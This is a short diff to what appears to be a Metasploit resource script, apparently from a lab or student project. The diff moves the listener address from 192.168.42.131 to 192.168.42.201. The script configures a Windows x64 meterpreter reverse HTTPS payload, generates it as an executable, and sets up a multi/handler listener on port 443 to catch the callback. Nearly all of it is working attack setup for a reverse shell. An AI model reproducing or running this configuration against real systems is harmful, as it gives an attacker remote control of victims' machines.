@@ -4,7 +4,7 @@ setg LogLevel 3
 ## PAYLOAD
 use payload/windows/x64/meterpreter_reverse_https
 
-set LHOST 192.168.42.131
+set LHOST 192.168.42.201
 set LPORT 443
 #set LPORT 80
 
@@ -22,12 +22,12 @@ generate -f exe -o /mnt/hgfs/Shared_Folder/bachelor/meterpreter_out/meterpreter.
 use multi/handler
 set payload windows/x64/meterpreter_reverse_http
 
-set LHOST 192.168.42.131
+set LHOST 192.168.42.201
 set LPORT 443
 
 
 set reverseAllowProxy false
-set ReverseListenerBindAddress 192.168.42.131
+set ReverseListenerBindAddress 192.168.42.201
 set ReverseListenerBindPort 5555
 
 set OverrideRequestHost true
